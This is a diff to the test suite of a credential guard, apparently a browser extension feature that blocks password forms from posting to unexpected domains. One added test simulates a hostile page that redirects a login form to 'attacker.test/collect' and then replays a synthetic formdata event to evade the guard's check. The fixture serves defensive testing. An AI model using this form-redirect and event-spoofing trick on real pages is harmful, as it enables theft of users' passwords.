@@ -1769,6 +1769,13 @@ describe("credential_guard", () => {
       mockGetRegDomain.mockImplementation((host: string) => host.split(".").slice(-2).join("."));
     });
 
+    // The guard only trusts the browser's own formdata; dispatchEvent is untrusted.
+    function trustedFormData(): Event {
+      const ev = new Event("formdata", { bubbles: true });
+      Object.defineProperty(ev, "isTrusted", { value: true });
+      return ev;
+    }
+
     function formWithButton(): { form: HTMLFormElement; btn: HTMLButtonElement; planned: string[] } {
       const form = createPasswordForm("https://example.com/session");
       const btn = document.createElement("button");
@@ -1781,7 +1788,7 @@ describe("credential_guard", () => {
           const ev = new SubmitEvent("submit", { bubbles: true, cancelable: true, submitter: submitter ?? null });
           form.dispatchEvent(ev);
           if (ev.defaultPrevented) return;
-          form.dispatchEvent(new Event("formdata", { bubbles: true }));
+          form.dispatchEvent(trustedFormData());
           planned.push(submitter?.getAttribute("formaction") ?? form.getAttribute("action") ?? "");
         }),
       );
@@ -1865,12 +1872,34 @@ describe("credential_guard", () => {
       expect(pageRuns).toBe(1); // only the resumed submit reached the page listener
     });
 
+    it("keeps a moved submit moved when the page replays a synthetic formdata (#1100 review)", async () => {
+      mockShowModal.mockResolvedValueOnce("proceed_once").mockResolvedValueOnce("cancel");
+      const { form, btn, planned } = formWithButton();
+      form.addEventListener("submit", () => btn.setAttribute("formaction", "https://attacker.test/collect"));
+      let replaying = false;
+      form.addEventListener("formdata", () => {
+        if (replaying) return;
+        replaying = true;
+        // The browser already fixed the attacker URL; restore the approved one
+        // and fire a synthetic formdata so a re-read sees "unchanged".
+        btn.setAttribute("formaction", "https://example.com/session");
+        form.dispatchEvent(new Event("formdata", { bubbles: true }));
+        replaying = false;
+      });
+
+      await dispatchSubmit(form, btn);
+      await flushMicrotasks();
+
+      expect(planned[0]).toBe("https://example.com/session"); // stub reads post-reset attrs
+      expect(stopSpy).toHaveBeenCalledTimes(1); // still cancelled: moved stayed true
+    });
+
     it("ignores a page that cancels the resumed submit and builds its own FormData", async () => {
       mockShowModal.mockResolvedValue("proceed_once");
       const { form, btn, planned } = formWithButton();
       form.addEventListener("submit", (e) => {
         btn.setAttribute("formaction", "https://api.other.test/login");
-        form.dispatchEvent(new Event("formdata", { bubbles: true })); // `new FormData(form)`
+        form.dispatchEvent(trustedFormData()); // `new FormData(form)`
         e.preventDefault(); // SPA: the page sends it with fetch
       });
 
